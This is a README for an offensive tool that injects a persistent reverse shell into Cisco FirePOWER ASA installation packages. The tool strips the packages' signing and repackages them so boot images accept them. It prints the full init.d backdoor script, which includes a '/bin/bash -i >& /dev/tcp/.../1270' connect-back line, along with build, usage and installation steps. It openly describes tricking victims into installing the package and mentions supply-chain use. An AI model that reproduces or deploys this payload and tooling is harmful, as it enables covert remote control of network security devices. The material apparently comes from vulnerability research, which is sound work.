# What's Up?

*What's Up?* is a tool for embedding a reverse shell in [FirePOWER Services Software for ASA](https://software.cisco.com/download/home/286283326/type/286277393/release/6.2.3) installation packages (e.g. asasfr-sys-6.2.3-83.pkg). The packages, as provided by Cisco, are encrypted **and** signed and therefore cannot be modified. However, the ASA FirePOWER module boot image *will* accept an unsigned package as long as it's packaged correctly.

*What's Up?* will unpackage the encrypted and signed package, reformat the data into an unsigned package, and insert the desired reverse shell into the package's installation script (`install.sh`). When the victim installs the package, the following payload will be added to the `init.d` scripts with a corresponding symlink in `/etc/rc.d/rc3.d/`

```
#!/bin/sh

source /etc/rc.d/init.d/functions
PATH="/usr/local/bin:/usr/bin:/bin:/usr/local/sf/bin:/sbin:/usr/sbin"

xploit_start() {
  (sleep 300 && /bin/bash -i >& /dev/tcp/10.0.0.28/1270 0>&1)&
}

case "\$1" in
'start')
  xploit_start
  ;;
*)
  echo "usage $0 start|stop|restart"
esac
```

*What's Up* generated packages are most likely useful when tricking a user to install content. For example, if an unexpecting soul downloads the package off of the internet or a trusted 3rd party instructs the victim to install the malicous package. Technically speaking, it's also useful in a supply chain attack, but an attacker can do that manually as well.

## Performance

*What's Up?* is sort of slow. Due to the amount of decryption, unpacking, and repacking, it can take up to 15 minutes to run. I also foolishly shove the entirety of the `pkg` file into memory... twice! So it can be a real memory hog too. 

## Tested?

*What's Up?* was written and tested on Ubuntu 20.04.04. I don't promise it will work anywhere else. I've manipulated the following packages and verified the following boot images load them:

* [asasfr-sys-5.4.1-211.pkg](https://software.cisco.com/download/home/286283326/type/286277393/release/5.4.1) using [asasfr-5500x-boot-5.4.1-211.img](https://www.virustotal.com/gui/file/0f231a57651c3054fab788ebc0f58bf66af27329a754443e336d714c3b04da53)
* [asasfr-sys-6.2.3-83.pkg](https://software.cisco.com/download/home/286283326/type/286277393/release/6.2.3) using [asasfr-5500x-boot-6.2.3-4.img](https://www.virustotal.com/gui/file/3c15f8c9d3b4480f97ae61a070e1fe33749dcde609e95002ce755e90d1bbde71)

Unfortunately, `pkg` files are too large for VirusTotal.

## Compilation

Compile with CMake:

```
albinolobster@ubuntu:~/whatsup/build$ cmake ..
-- The C compiler identification is GNU 9.4.0
-- The CXX compiler identification is GNU 9.4.0
-- Check for working C compiler: /usr/bin/cc
-- Check for working C compiler: /usr/bin/cc -- works
-- Detecting C compiler ABI info
-- Detecting C compiler ABI info - done
-- Detecting C compile features
-- Detecting C compile features - done
-- Check for working CXX compiler: /usr/bin/c++
-- Check for working CXX compiler: /usr/bin/c++ -- works
-- Detecting CXX compiler ABI info
-- Detecting CXX compiler ABI info - done
-- Detecting CXX compile features
-- Detecting CXX compile features - done
-- Configuring done
-- Generating done
-- Build files have been written to: /home/albinolobster/whatsup/build
albinolobster@ubuntu:~/whatsup/build$ make
Scanning dependencies of target whatsup
[ 50%] Building CXX object CMakeFiles/whatsup.dir/src/main.cpp.o
[100%] Linking CXX executable whatsup
[100%] Built target whatsup
albinolobster@ubuntu:~/whatsup/build$ 
```

## Usage Example

*What's Up* accepts three inputs:

* A valid/signed Cisco created FirePOWER software package (e.g. asasfr-sys-6.2.3-83.pkg)
* An LHOST to connect back to (e.g. 10.0.0.28)
* An LPORT to connect back to (e.g. 1270)

```
albinolobster@ubuntu:~/whatsup/build$ ./whatsup -i ~/Desktop/asasfr-sys-5.4.1-211.pkg --lhost 10.0.0.28 --lport 1270
   __      __  __               __    __
  /\ \  __/\ \/\ \             /\ \__/\ \
  \ \ \/\ \ \ \ \ \___      __ \ \ ,_\ \/ ____
   \ \ \ \ \ \ \ \  _ `\  /'__`\\ \ \/\/ /',__\
    \ \ \_/ \_\ \ \ \ \ \/\ \L\.\\ \ \_ /\__, `\
     \ `\___x___/\ \_\ \_\ \__/.\_\ \__\\/\____/
      '\/__//__/  \/_/\/_/\/__/\/_/\/__/ \/___/
   __  __
  /\ \/\ \
  \ \ \ \ \  _____            jbaines-r7
   \ \ \ \ \/\ '__`\              🦞
    \ \ \_\ \ \ \L\ \      "What's going on?"
     \ \_____\ \ ,__/
      \/_____/\ \ \/
               \ \_\
                \/_/

[+] User provided package: /home/albinolobster/Desktop/asasfr-sys-5.4.1-211.pkg
[+] Copying the provided file to ./tmp
[+] Extracting decryption materials
[+] Attempting to decrypt the package... this might take 10ish minutes (and a lot of memory, sorry!)
[+] Successful decryption! Cleaning up extra files
[+] Unpacking...
... snip lot's of annoying output ...
[+] Generating the data archive
[+] Creating new.pkg...
[+] Writing file and section headers
[+] Appending the compressed archive
[+] Appending the checksum section
[+] Completed new.pkg
```

## Installation Example

The `new.pkg` file then needs to be installed on an ASA-X with FirePOWER services. Installation goes something like this (note that the output is overly simplified - actual installation can take ~2 hours and some commands will not immediately be available because the software is chugging along in the background):

```
albinolobster@ubuntu:~$ ssh -oKexAlgorithms=+diffie-hellman-group14-sha1 albinolobster@10.0.0.21
albinolobster@10.0.0.21's password: 
User albinolobster logged in to ciscoasa
Logins over the last 3 days: 38.  Last login: 20:59:32 UTC Jun 10 2022 from 10.0.0.28
Failed logins since the last login: 0.  
Type help or '?' for a list of available commands.
ciscoasa> en
Password: 
ciscoasa# sw-module module sfr recover configure image disk0:/asasfr-5500x-boot-5.4.1-211.img
ciscoasa# sw-module module sfr recover boot
ciscoasa# session sfr console
```

## Credit

* 4 Non Blondes: https://www.youtube.com/watch?v=6NXnxTNIWkc
* [plusaes](https://github.com/kkAyataka/plusaes) using the Boost Software License
* [PicoSHA2](https://github.com/okdshin/PicoSHA2) using the MIT license
